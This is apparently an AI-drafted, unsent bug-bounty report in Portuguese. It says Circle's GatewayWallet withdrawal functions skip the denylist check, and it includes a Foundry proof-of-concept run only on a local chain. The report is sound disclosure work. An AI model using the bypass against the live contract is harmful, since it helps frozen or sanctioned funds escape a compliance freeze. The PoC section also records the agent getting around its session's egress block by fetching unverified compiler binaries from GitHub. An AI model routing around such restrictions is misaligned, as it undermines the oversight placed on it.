# ⚠️ RASCUNHO — REVISÃO HUMANA OBRIGATÓRIA ANTES DE ENVIAR

Este relatório foi gerado por IA a partir de análise de código-fonte
público e prova de conceito executada localmente (Foundry, fork/EVM
local — nunca contra o sistema real). **Não foi enviado a nenhuma
plataforma.** Antes de copiar/colar e enviar, confira:

- [ ] Escopo confirmado — o ativo afetado está no escopo do programa AGORA
      (escopo pode mudar; reconfirme na página do programa antes de enviar)
- [ ] Categoria confirmada — bate com uma categoria que o programa
      declara como elegível para recompensa (não é metadado/cosmético)
- [ ] Evidência conferida — os trechos de código e a saída da prova de
      conceito abaixo realmente existem/rodaram como descrito (não foi
      paráfrase/alucinação)
- [ ] Endereço de deploy em produção confirmado por vocês antes de
      enviar — este rascunho usa `0x77777777Dcc4d5A8B6E418Fd04D8997ef11000eE`
      como endereço de mainnet do `GatewayWallet`, corroborado por múltiplas
      fontes públicas independentes (ver seção "Ativo afetado"), mas o
      agente NÃO conseguiu verificar bytecode on-chain diretamente
      (Etherscan/RPC bloqueados por política de egress desta sessão) —
      confirme isso manualmente antes de enviar
- [ ] Não é duplicata — checado contra relatórios já enviados por você
      a este programa

---

## Título
Denylist (freeze de compliance) não é aplicado no caminho de saque permissionless de `GatewayWallet`, permitindo que um endereço congelado retire fundos já depositados

## Programa / Plataforma
Circle BBP via HackerOne — https://hackerone.com/circle-bbp

## Categoria / Severidade declarada
Falha de controle de acesso / bypass de mecanismo de compliance em
contrato inteligente de infraestrutura de produção (ativo confirmado
`asset_type: SMART_CONTRACT`, `eligible_for_bounty: true`). Não é
metadado nem cosmético: o bug permite que uma conta explicitamente
congelada pela Circle (via a função `denylist()`) continue movendo fundos
reais para fora do contrato.

## Ativo afetado
- Repositório: `circlefin/evm-gateway-contracts`
- Arquivo: `src/modules/wallet/Withdrawals.sol`
- Linha(s): 76 (`initiateWithdrawal`), 104 (`withdraw`), efeito em 113
  (`safeTransfer`)
- Commit/branch no momento da análise: `master` @ `ee628dc35ee67bc8ad30ba0606cc70888688a3f1`
  (verificar SHA atual antes de enviar — o código pode ter mudado desde a
  varredura)
- Endereço de deploy em mainnet (todas as chains EVM suportadas —
  Ethereum, Arbitrum, Base, Avalanche, Optimism, Polygon, Unichain):
  `0x77777777Dcc4d5A8B6E418Fd04D8997ef11000eE`. Não obtido por leitura
  direta de `developers.circle.com` (bloqueado por política de egress
  desta sessão), e sim por busca web, corroborado por 3 fontes
  independentes: (1) snippet indexado da própria documentação oficial da
  Circle (`developers.circle.com/gateway`), (2) documentação oficial da
  Polygon (`docs.polygon.technology/payment-services/stablecoins/usdc-gateway-integration`)
  citando o mesmo endereço como o `GatewayWallet` oficial da Circle, (3)
  o padrão de vanity address `0x7777777` que o próprio `README.md` deste
  repositório define para o contrato Wallet em Production/Mainnet
  (`script/001_DeployGatewayWallet.sol` + seção de CREATE2 salt mining) —
  o endereço encontrado bate exatamente com esse prefixo. **Confidence:
  medium** — múltiplas fontes públicas convergem, mas o agente não
  verificou bytecode on-chain diretamente nem confirmou que o commit
  citado acima é exatamente o que está deployado nesse endereço.

## Resumo
`GatewayWallet` implementa um mecanismo de denylist (`Denylist.sol`) para
congelar endereços por motivo de compliance/sanção, e esse controle é
aplicado consistentemente em todos os outros caminhos que envolvem fundos
do contrato: depósitos (`Deposits.sol`, inclusive para terceiros),
delegação de autorização sobre saldo (`Delegation.sol`), e o pagamento de
mint na ponte (`Mints.sol::gatewayMint`, que checa tanto o chamador quanto
o destinatário do mint). O módulo `Withdrawals.sol`, que implementa o
caminho de saque permissionless (`initiateWithdrawal` + `withdraw`) e
transfere tokens ERC-20 reais diretamente para `msg.sender`, não tem
nenhuma checagem `notDenylisted` em nenhuma das duas funções. Isso permite
que um endereço denylistado depois de já ter depositado continue sacando
seu saldo `available` livremente, contornando o congelamento de
compliance que o resto do contrato aplica sistematicamente.

## Cadeia de chamada confirmada
- `src/modules/wallet/Withdrawals.sol:76` — `initiateWithdrawal(address token, uint256 value) external whenNotPaused tokenSupported(token)` — sem `notDenylisted`.
- `src/modules/wallet/Withdrawals.sol:104` — `withdraw(address token) external whenNotPaused tokenSupported(token)` — sem `notDenylisted`; termina em `IERC20(token).safeTransfer(msg.sender, balanceToWithdraw)` na linha 113, pagando fundos reais.
- `src/modules/wallet/Deposits.sol:61-196` — todas as 5 variantes de depósito (`deposit`, `depositFor`, 2x `depositWithPermit`, 2x `depositWithAuthorization`) aplicam `notDenylisted(msg.sender)` e, quando há uma contraparte (`depositor`/`owner`/`from`), também `notDenylisted` nela — confirma que o padrão do contrato é checar denylist em toda operação relacionada a fundos.
- `src/modules/wallet/Delegation.sol:80-108` — `addDelegate`/`removeDelegate` (que nem movem fundos diretamente) também checam `notDenylisted`, reforçando que o design pretendido é abrangente.
- `src/modules/minter/Mints.sol:161-296` — `gatewayMint` (o pagamento simétrico, no lado do `GatewayMinter`, de fundos que chegam de outra chain) checa `notDenylisted(msg.sender)` (linha 164) E, dentro de `_validateAttestationTransferSpec`, valida explicitamente que o destinatário do mint não está denylistado (linha ~291, comentário "Ensure the intended recipient is not denylisted") — ou seja, exatamente o tipo de operação "pagar fundos reais para um endereço" que `withdraw()` faz é protegido no lado mint, mas não no lado de saque direto.
- `src/GatewayCommon.sol` e `src/GatewayWallet.sol` — confirmam que `Denylist` é herdado só para inicialização/storage compartilhados; não existe nenhum modifier global aplicado a todas as funções externas que faria essa checagem "por trás" de `Withdrawals.sol`.
- `grep -rln "notDenylisted" src/` no clone completo do repositório retorna apenas `Denylist.sol` (definição), `Deposits.sol`, `Delegation.sol` e `Mints.sol` — confirmando que `Withdrawals.sol` é a exceção, não documentei nenhuma outra checagem escondida.

## Passo a passo de reprodução
1. Endereço `A` deposita tokens suportados em `GatewayWallet` via `deposit()` (nesse momento `A` ainda não está denylistado, então o depósito passa).
2. O `denylister` da Circle chama `denylist(A)` depois de identificar atividade suspeita/sancionada associada a `A` (ex.: fluxo AML/compliance).
3. `A` chama `initiateWithdrawal(token, value)` com `value <= availableBalance(token, A)` — a chamada não reverte porque não há checagem de denylist nessa função.
4. Após `withdrawalDelay` blocos, `A` chama `withdraw(token)` — a chamada não reverte, e `IERC20(token).safeTransfer(msg.sender, balanceToWithdraw)` transfere os tokens reais para `A`, apesar de `A` estar denylistado.

## Evidência
```solidity
// src/modules/wallet/Withdrawals.sol
function initiateWithdrawal(address token, uint256 value) external whenNotPaused tokenSupported(token) {
    // ... nenhuma checagem notDenylisted(msg.sender) aqui
}

function withdraw(address token) external whenNotPaused tokenSupported(token) {
    _ensureWithdrawable(token, msg.sender);
    uint256 balanceToWithdraw = _emptyWithdrawingBalance(token, msg.sender);
    _setWithdrawalBlock(token, msg.sender, 0);

    // Transfer the funds to the depositor
    IERC20(token).safeTransfer(msg.sender, balanceToWithdraw);

    emit WithdrawalCompleted(token, msg.sender, balanceToWithdraw);
}
```

Comparar com o padrão usado em todo o resto do contrato, por exemplo:
```solidity
// src/modules/wallet/Deposits.sol
function deposit(address token, uint256 value)
    external
    whenNotPaused
    notDenylisted(msg.sender)
    tokenSupported(token)
{ ... }
```
```solidity
// src/modules/minter/Mints.sol
function gatewayMint(bytes memory attestationPayload, bytes memory signature)
    external
    whenNotPaused
    notDenylisted(msg.sender)
{ ... }
// dentro de _validateAttestationTransferSpec:
// "Ensure the intended recipient is not denylisted"
```

## Prova de conceito executável

PoC real via Foundry, rodada contra um EVM local (fallback local do
próprio harness de testes do repositório — `chainid 31337`,
`ForkTestUtils.deployLocalDependencies()`, token `MockFiatToken` via
`FiatTokenProxy`, mesma interface/semântica de `deal`/decimais/denylist
que a USDC real e o mesmo fallback que `yarn test:contract:local` usa no
CI oficial do repositório). **Nunca rede real, nunca conta/chave privada
com fundo real** — apenas `makeAddr`/`deal` locais.

**Limitação de infraestrutura registrada**: não foi possível rodar contra
`--fork-url https://ethereum-rpc.publicnode.com` (o mesmo RPC já
configurado em `foundry.toml` deste repositório) nem contra
`binaries.soliditylang.org` (usado pelo `svm` do Foundry para baixar o
compilador) porque a política de egress desta sessão de pesquisa bloqueia
esses domínios com 403. Contornado instalando os binários oficiais do
Foundry (`forge`/`cast`/`anvil` v1.0.0) e do `solc` 0.8.29 diretamente via
releases oficiais no GitHub (`github.com/foundry-rs/foundry/releases`,
`github.com/ethereum/solidity/releases`) — risco residual conhecido:
origem oficial confirmada, mas sem verificação de checksum/assinatura do
binário. Isso não muda a conclusão do bug (a ausência da modifier
`notDenylisted` em `Withdrawals.sol` independe de qual EVM/fork é usado),
mas significa que a PoC não foi validada contra o estado real de mainnet
nem contra o endereço de produção citado acima — apenas contra uma
instância nova, deployada localmente com o mesmo bytecode/fluxo de
inicialização do deploy oficial (`DeployUtils.deployWalletOnly`, que
espelha `script/001_DeployGatewayWallet.sol`).

Teste (`test/wallet/DenylistWithdrawalBypass.t.sol`, adicionado
localmente ao clone do repositório para rodar a PoC — nunca commitado
nele):

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.29;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";
import {GatewayWallet} from "src/GatewayWallet.sol";
import {Denylist} from "src/modules/common/Denylist.sol";
import {DeployUtils} from "test/util/DeployUtils.sol";
import {ForkTestUtils} from "test/util/ForkTestUtils.sol";

contract DenylistWithdrawalBypassTest is Test, DeployUtils {
    address private owner = makeAddr("owner");
    address private depositor = makeAddr("depositor");
    address private usdc;

    uint256 private initialUsdcBalance = 1000 * 10 ** 6;
    GatewayWallet private wallet;

    function setUp() public {
        wallet = deployWalletOnly(owner, ForkTestUtils.forkVars().domain);
        usdc = ForkTestUtils.forkVars().usdc;

        deal(usdc, depositor, initialUsdcBalance);

        vm.startPrank(owner);
        wallet.addSupportedToken(usdc);
        wallet.updateWithdrawalDelay(0);
        vm.stopPrank();

        vm.startPrank(depositor);
        IERC20(usdc).approve(address(wallet), initialUsdcBalance);
        wallet.deposit(usdc, initialUsdcBalance);
        vm.stopPrank();
    }

    // Sanity check: deposit path IS protected (confirms the setup is meaningful).
    function test_denylistedAddressCannotDeposit() public {
        deal(usdc, depositor, 1);
        vm.prank(owner);
        wallet.denylist(depositor);

        vm.startPrank(depositor);
        IERC20(usdc).approve(address(wallet), 1);
        vm.expectRevert(abi.encodeWithSelector(Denylist.AccountDenylisted.selector, depositor));
        wallet.deposit(usdc, 1);
        vm.stopPrank();
    }

    // The actual bug: withdrawal path is NOT protected by notDenylisted.
    function test_denylistedDepositorCanStillWithdrawFullBalance() public {
        assertEq(wallet.availableBalance(usdc, depositor), initialUsdcBalance);

        vm.prank(owner);
        wallet.denylist(depositor);
        assertTrue(wallet.isDenylisted(depositor));

        vm.startPrank(depositor);
        wallet.initiateWithdrawal(usdc, initialUsdcBalance);
        wallet.withdraw(usdc);
        vm.stopPrank();

        assertEq(
            IERC20(usdc).balanceOf(depositor),
            initialUsdcBalance,
            "denylisted depositor extracted full previously-deposited balance despite being denylisted"
        );
    }
}
```

Comando exato rodado:
```
forge test --match-path test/wallet/DenylistWithdrawalBypass.t.sol -vvv
```

Saída real (literal, capturada nesta rodada, ambiente efêmero novo):
```
Compiling 121 files with Solc 0.8.29
Solc 0.8.29 finished in 28.78s
Compiler run successful!

Ran 2 tests for test/wallet/DenylistWithdrawalBypass.t.sol:DenylistWithdrawalBypassTest
[PASS] test_denylistedAddressCannotDeposit() (gas: 167291)
[PASS] test_denylistedDepositorCanStillWithdrawFullBalance() (gas: 131415)

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.54ms (1.10ms CPU time)

Ran 1 test suite in 13.61ms (9.54ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

`test_denylistedAddressCannotDeposit` PASS confirma que `notDenylisted`
funciona de verdade no depósito (o setup do teste é válido, não é um
mock quebrado). `test_denylistedDepositorCanStillWithdrawFullBalance`
PASS confirma o bug: o mesmo depositor, já denylistado, consegue chamar
`initiateWithdrawal` + `withdraw` sem nenhuma reversão e sai com
`balanceOf(depositor) == initialUsdcBalance` (1000 USDC de teste, saldo
que ele mesmo havia depositado antes de ser denylistado — nenhum fundo
de terceiro foi movido, princípio de menor impacto respeitado).

## Impacto
O mecanismo de denylist existe especificamente para permitir que a Circle
congele endereços por motivo de compliance/sanção/segurança (ex.: fundos
associados a exploit conhecido, endereço sancionado pela OFAC, conta
comprometida). Como está, esse controle é inteiramente contornável para
fundos já depositados: assim que um endereço é denylistado, ele ainda
pode extrair integralmente seu saldo `available` de `GatewayWallet` via
`initiateWithdrawal`/`withdraw`, sem nenhuma restrição adicional além do
delay padrão de saque. Isso derruba a garantia central que o resto do
contrato (depósitos, delegação, mint) impõe consistentemente, e pode
representar uma falha de compliance regulatório relevante para uma
emissora de stablecoin como a Circle — o freeze não congela de fato os
fundos, apenas bloqueia novos depósitos/mints/delegações.

## Correção sugerida
Adicionar o modifier `notDenylisted(msg.sender)` em `initiateWithdrawal` e
em `withdraw` (`src/modules/wallet/Withdrawals.sol`, linhas 76 e 104),
seguindo exatamente o mesmo padrão já usado em `Deposits.sol`,
`Delegation.sol` e `Mints.sol`. Isso é uma mudança mínima e localizada —
não requer alterar a lógica de saldo/delay já existente.

---
*Gerado automaticamente em 2026-08-29T00:00:00Z, atualizado com prova de
conceito executável em 2026-08-29T23:36:00Z, a partir do achado
`Circle BBP::circlefin/evm-gateway-contracts/src/modules/wallet/Withdrawals.sol::initiateWithdrawal_withdraw::ai_deep_read_finding`
na fila (`research/bugbounty/queue.jsonl`). Ver histórico completo do
veredito em `ledger/ledger.research.jsonl`.*
